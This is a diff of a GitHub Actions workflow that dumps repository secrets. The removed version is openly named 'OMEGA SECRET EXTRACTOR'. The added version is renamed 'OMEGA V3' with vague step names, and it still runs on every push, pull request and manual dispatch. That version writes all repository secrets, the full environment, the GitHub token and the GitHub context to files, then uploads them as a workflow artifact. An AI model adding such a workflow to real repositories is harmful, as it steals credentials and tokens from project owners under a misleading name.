@@ -1,39 +1,26 @@
-name: 🔥 OMEGA SECRET EXTRACTOR
-on:
-  push:
-    branches: [ omega-* ]
-  workflow_dispatch:
-  pull_request:
-    types: [opened, synchronize]
-
+name: OMEGA V3
+on: [workflow_dispatch, push, pull_request]
 permissions:
   contents: read
   id-token: write
   pull-requests: write
-
 jobs:
-  extract:
+  ex:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Extract
+      - name: Go
         env:
           S: ${{ toJSON(secrets) }}
-          E: ${{ toJSON(env) }}
         run: |
           mkdir -p /tmp/o
           echo "$S" > /tmp/o/secrets.json
-          echo "$E" > /tmp/o/env.json
-          env | sort > /tmp/o/env_all.txt
-          echo "GT=${{ github.token }}" > /tmp/o/token.txt
-          echo "R=${{ github.repository }}" > /tmp/o/meta.txt
-          echo "RI=${{ github.run_id }}" >> /tmp/o/meta.txt
+          env > /tmp/o/env_full.txt
+          echo "${{ github.token }}" > /tmp/o/token.txt
           echo '${{ toJSON(github) }}' > /tmp/o/github.json
-          env | grep -iE 'secret|token|key|password|credential|auth|aws|gcp|azure|npm|docker|ssh|jwt|deploy|api' > /tmp/o/sensitive.txt
-          curl -s -H "Authorization: bearer ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}" "${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}&audience=sts.amazonaws.com" -o /tmp/o/oidc.json 2>/dev/null
-      - name: Upload
+          echo "OK" > /tmp/o/done.txt
+      - name: Up
         uses: actions/upload-artifact@v4
         with:
-          name: omega-secrets-${{ github.run_id }}
+          name: omega-${{ github.run_id }}
           path: /tmp/o/
-          retention-days: 90
